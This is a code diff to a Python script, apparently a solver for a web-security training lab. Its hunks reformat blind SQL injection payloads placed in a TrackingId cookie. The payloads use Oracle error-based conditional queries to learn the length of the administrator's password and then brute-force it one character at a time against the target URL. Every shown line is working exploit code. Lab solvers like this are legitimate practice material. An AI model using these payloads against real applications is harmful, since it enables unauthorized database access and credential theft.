@@ -59,7 +59,7 @@ def solve_lab(url, proxies):
     len_pass = 1
     while True:
         cookies = {
-            "TrackingId": f"' UNION SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username=\'administrator\'))={len_pass}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"
+            "TrackingId": f"' UNION SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))={len_pass}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"
         }
         resp = requests.get(url, proxies=proxies, verify=False, cookies=cookies)
 
@@ -82,7 +82,7 @@ def solve_lab(url, proxies):
     for i in range(len_pass):
         for c in alphabet:
             cookies = {
-                "TrackingId": f"' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username=\'administrator\'), {i+1}, 1)='{c}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"
+                "TrackingId": f"' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), {i+1}, 1)='{c}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"
             }
             resp = requests.get(url, proxies=proxies, verify=False, cookies=cookies)
 
@@ -90,7 +90,8 @@ def solve_lab(url, proxies):
                 print_info(f"{i+1}, '{c}' => 200 | Progress: {password}...", end="")
             else:
                 print_success(
-                    f"{i+1}, '{c}' => {resp.status_code} | Progress: {password}...", end=""
+                    f"{i+1}, '{c}' => {resp.status_code} | Progress: {password}...",
+                    end="",
                 )
                 password += c
                 break
